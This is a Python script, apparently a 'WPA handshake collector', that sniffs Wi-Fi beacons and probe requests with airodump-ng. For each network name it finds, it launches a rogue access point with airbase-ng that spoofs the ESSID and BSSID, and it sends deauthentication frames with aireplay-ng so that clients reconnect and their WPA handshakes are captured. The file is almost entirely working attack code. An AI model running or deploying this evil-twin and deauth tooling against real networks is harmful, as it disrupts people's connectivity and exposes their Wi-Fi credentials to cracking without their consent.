
from Logger import Logger
from Monitor import Monitor
import subprocess
from time import sleep
from threading import Thread, Lock, Timer
from binascii import unhexlify, hexlify
import argparse
import os

lock = Lock()

cache = []

dump_num = 5


def start_AP(essid, bssid, netw_iface, path, channel, logger):
    '''
    start new access point with certain parameters
    input:
        essid - essid of access point
        bssid - bssid of access point
        netw_iface - network interface name
        path - current dir
        channel - AP channel
    output:
        no
    '''
    try:
        import subprocess
        mon = Monitor(logger)
        lock.acquire()
        new_mon = mon.push(netw_iface, channel)
        mon.logger.addToLine('start_AP', "new interface " + new_mon, 'log')
        lock.release()
        sleep(1)
        
        kill = lambda process: process.terminate()
        import os
        os.chdir(path + "/logs/")
        try:
            if bssid == b"\xff\xff\xff\xff\xff\xff":
                lock.acquire()
                logger.addToLine('start_AP', f"AP params airbase-ng --essid {essid} -c {channel} -F {essid} {new_mon}", 'log')
                lock.release()
                cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", new_mon])
            else:
                lock.acquire()
                logger.addToLine('start_AP', f"AP params airbase-ng --essid {essid} -a {hexlify(bssid)} -c {channel} -F {essid} {new_mon}", 'log')
                lock.release()
                cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", new_mon])
            timer = Timer(3, kill, [cmd])
            timer.start()
            if bssid != b"\xff\xff\xff\xff\xff\xff":
                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", new_mon])
            stdout, stderr = cmd.communicate()
        finally:
            timer.cancel()
            subprocess.check_call(["airmon-ng", "stop", new_mon, channel])

    except Exception as e:
        lock.acquire()
        logger.addToLine('start_AP', f"falled with params essid:{essid}, bssid:{bssid}, netw_iface:{netw_iface}, path:{path}, channel:{channel}", 'err')
        lock.release()


def lookup_dump(pcap_dump, netw_iface, path, logger):
    '''
    lookup pcap dump and collect AP's and client's beacon packets
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    from pcapfile.savefile import load_savefile
    from time import time
    packet_index = -1
    error_index = 0
    flag = False
    try:
        while True:
            try:
                f = open(f"{path}/sniffed/{pcap_dump}", 'rb')
                capfile = load_savefile(f)
                packets = capfile.packets
                start = time()*1000
                while time()*1000 - start <= 10:
                    packet_index += 1
                    _pack = unhexlify(packets[packet_index].packet)
                    # if the packet is really a beacon
                    if 128 == _pack[0]:
                        essid_len = _pack[37]
                        if essid_len != 0:
                            current_essid = (_pack[38: 38 + essid_len]).decode("ascii")
                            if _pack[38: 38 + essid_len] != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache) and (_pack[38] != 0):  # if we've already seen this ESSID before
                                lock.acquire()
                                logger.addToLine(
                                    'lookup_dump', f"in {str(packet_index + 1)} of {path}/sniffed/{pcap_dump} ESSID {current_essid} found", 'log')
                                lock.release()
                                cache.append(current_essid)
                                # ------
                                bssid = _pack[16: 22]
                                rates_len = _pack[38 + essid_len + 1]
                                channel = _pack[38 + essid_len + 1 + rates_len + 1 + 1 + 1]
                                print
                                if current_essid[0] != 0:
                                    start_AP(current_essid, bssid, netw_iface, path, str(channel), logger)
                                    sleep(1)

                    # or if the packet is really a probe request
                    elif 64 == _pack[0]:
                        essid_len = _pack[25]
                        # ---------
                        if essid_len != 0:
                            current_essid = (_pack[26: 26 + essid_len]).decode("ascii")
                            if (_pack[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff':  # if we've already seen this ESSID before
                                lock.acquire()
                                logger.addToLine('lookup_dump', "in "  + str(packet_index + 1) +\
                                                " ESSID " + current_essid + " found", 'log')
                                lock.release()
                                cache.append(current_essid)
                                start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1), logger)
                                sleep(1)

                f.close()

            except IOError:
                lock.acquire()
                logger.addToLine('lookup_dump', pcap_dump + " file is not ready yet...", 'log')
                lock.release()
                sleep(2)
                # --------
                if error_index == 5:
                    lock.acquire()
                    logger.addToLine('lookup_dump', "Waited too long, trying to scan the next file", 'err')
                    lock.release()
                    return 0
                # --------
                error_index += 1

            except IndexError:
                lock.acquire()
                logger.addToLine('lookup_dump', 'Scan is done', 'log')
                lock.release()
                break

            except Exception as e:
                print(str(e))
    except KeyboardInterrupt:
        exit(1)


def start_sender(netw_iface, path, logger):
    '''
    lookup for pcap dump files in /logs folder
    input:
        pcap_dump - file 
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    import os
    os.chdir(path + "/logs/")
    # -------------------------------------
    i = 1
    while i <= dump_num:
        if i <= 9:
            dump = "beac_dump-0" + str(i) + ".cap"
        else:
            dump = "beac_dump-" + str(i) + ".cap"

        lookup_dump(dump, netw_iface, path, logger)
        i += 1


def timeout(p):
    p.kill()


def start_sniffer(netw_iface, path, logger):
    '''
    monitor broadcast and save anything to pcap dump files in /logs folder
    input:
        netw_iface - network interface name
        path - current dir
    output:
        no
    '''
    mon = Monitor(logger)
    lock.acquire()
    new_mon = mon.push(netw_iface)
    mon.logger.addToLine('start_sniffer', "new interface " + new_mon, 'log')
    lock.release()
    # --
    import os
    os.chdir(path + "/sniffed/")
    i = 0
    try:
        while i < dump_num:
            os.chdir(path + "/sniffed/")
            kill = lambda process: process.terminate()
            lock.acquire()
            logger.addToLine('start_sniffer', f"sniffer params airodump-ng {new_mon} --beacons --write beac_dump", 'log')
            lock.release()
            cmd = subprocess.Popen(["airodump-ng", new_mon, "--beacons", "--write", "beac_dump"])
            timer = Timer(5, kill, [cmd])
            try:
                timer.start()
                stdout, stderr = cmd.communicate()
            finally:
                timer.cancel()
            i += 1
        mon.pop(new_mon)
        lock.acquire()
        mon.logger.addToLine('start_sniffer', "sniffing has been finished", 'log')
        lock.release()

    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        lock.acquire()
        mon.logger.addToLine('start_sniffer', str(e) + '\n' + str(tb), 'error')
        lock.release()


def create_parser():
    '''
    create parser identity to parse cmd args
    input:
        no
    output:
        parser identity
    '''
    parser = argparse.ArgumentParser()
    parser.add_argument ('-s', '--send', type=str, default = '', help='name of the interface that is to be used for listening')
    parser.add_argument ('-l', '--listen', type=str, default = '', help = 'name of the interface that is to be used for creating AP and sending deauth packets')

    return parser


def create_folders():
    '''
    create folders
        current_timendate/
                        logs/ - false AP interaction dumps
                        dumps/ - simple air sniffing dunps
    input:
        no
    output:
        $PWD/current_timendate
    '''
    import datetime
    pwd = os.getcwd()
    _new = str(datetime.datetime.now())
    subprocess.call(["mkdir", _new])
    subprocess.call(["mkdir", _new + "/sniffed"])
    subprocess.call(["mkdir", _new + "/logs"])
    return pwd + "/" + _new


def get_available_wifaces():
    wifaces = subprocess.run(["iwconfig"], capture_output=True)
    print(wifaces.stdout)
    with open("iwfaces.txt", "w") as fw:
        fw.write(wifaces.stdout.decode('utf-8'))


if __name__ == "__main__":
    import sys
    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])
    logger = Logger()
 
    if not (namespace.send and namespace.listen):
        lock.acquire()
        logger.addToLine('__main__', 'invalid input params\n', 'error')
        lock.release()
        exit(1)
    try:
        # delete recent dump files
        '''lock.acquire()
        logger.addToLine('__main__', os.getcwd()+'/del_recent_dumps.sh', 'log')
        lock.release()
        exit_code = subprocess.call(os.getcwd() + '/del_recent_dumps.sh')'''
        # --
        # create dump folders and enter
        cwd = '/home/bob/dev/python/WPA-handshake-collector/WPA-handshake-collector/2022-05-18 19:35:58.447306'#create_folders()
        os.chdir(cwd)
        while True:
            task1 = Thread(target = start_sniffer, args=(namespace.listen, cwd, logger))
            task2 = Thread(target = start_sender, args=(namespace.send, cwd, logger))
            #task1.start()
            sleep(3)
            task2.start()
            lock.acquire()
            logger.addToLine('__main__', 'task1.is_alive: ' + str(task1.is_alive()), 'log')
            logger.addToLine('__main__', 'task2.is_alive: ' + str(task2.is_alive()), 'log')
            lock.release()
            if not (task1.is_alive() and task2.is_alive()):
                break

    except Exception as e:
        import traceback
        tb = traceback.format_exc()
        logger.addToLine('__main__', str(e) + '\n' + str(tb), 'error')


